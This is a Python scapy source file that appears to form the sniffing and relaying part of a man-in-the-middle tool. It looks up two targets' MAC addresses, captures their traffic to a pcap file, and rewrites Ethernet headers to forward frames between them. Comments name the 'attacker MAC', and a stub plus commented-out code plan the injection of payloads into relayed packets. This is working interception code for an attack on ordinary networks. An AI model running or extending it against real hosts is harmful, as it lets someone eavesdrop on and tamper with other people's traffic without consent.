import scapy.all as scapy
import sys
import os


class Sniffer:

    def __init__(self, target_1_ip, target_2_ip, write_to_pcap=False):
        self.write_to_pcap = self.set_new_pcap(write_to_pcap)
        self.iface = self.get_iface()
        self.target_1 = { "IP":target_1_ip, "MAC":self.get_mac(target_1_ip)}
        self.target_2 = {"IP": target_2_ip, "MAC": self.get_mac(target_2_ip)}

    def set_new_pcap(self, write_to_pcap):
        if write_to_pcap is False:
            return False
        else:
            if os.path.isfile("sniffed_packets.pcap"):
                os.remove("sniffed_packets.pcap")
            return True

    def sniff_packets(self):
        capture_filter = "(host " + self.target_1["IP"] + \
                         " or host " + self.target_2["IP"] + ")"
        scapy.sniff(iface=self.iface, filter=capture_filter, prn=lambda x: self.forward_packets(x))

    # Receive object scapy.Packet as argument
    def forward_packets(self, scapy_packet):
        print(scapy_packet.summary())
        l2_data = scapy_packet["Ethernet"]

        if self.write_to_pcap is True:
            scapy.wrpcap('sniffed_packets.pcap', scapy_packet, append=True)

        if l2_data.src == self.target_1["MAC"]:
            # l2_data.dst in the line below is the attacker MAC
            l2_data.src = l2_data.dst
            l2_data.dst = self.target_2["MAC"]
            scapy.sendp(scapy_packet, verbose=False)
        if l2_data.src == self.target_2["MAC"]:
            # l2_data.dst in the line below is the attacker MAC
            l2_data.src = l2_data.dst
            l2_data.dst = self.target_1["MAC"]
            scapy.sendp(scapy_packet, verbose=False)

        # if l2_data.src == self.target_1["MAC"] or l2_data.src == self.target_2["MAC"]:
        #     # l2_data.dst in the line below is the attacker MAC
        #     l2_data.src = l2_data.dst
        #     #olhar ip dst e achar mac
        #     l2_data.dst = mac(scapy_packet["IP"].dst)
        #     self.insert_payload(scapy_packet)
        #     scapy.sendp(scapy_packet, verbose=False)

    # Não esquecer de lidar com checksums!!
    def insert_payload(self, packet):
        return 0

    def get_iface(self):
        route = scapy.Route()
        iface = route.route(dst=self.target_1["IP"])[0]
        return iface

    @staticmethod
    def get_mac(ip):
        pckt = scapy.ARP(pdst=ip, hwdst="00:00:00:00:00:00")
        ans, unans = scapy.sr(pckt, timeout=5, verbose=False)
        # Check if answer was received
        if len(ans) > 0:
            for snd, rcv in ans:
                mac = rcv.hwsrc
            return mac
        else:
            sys.exit("Could not discover mac of target " + ip + ". Is this host really active?")
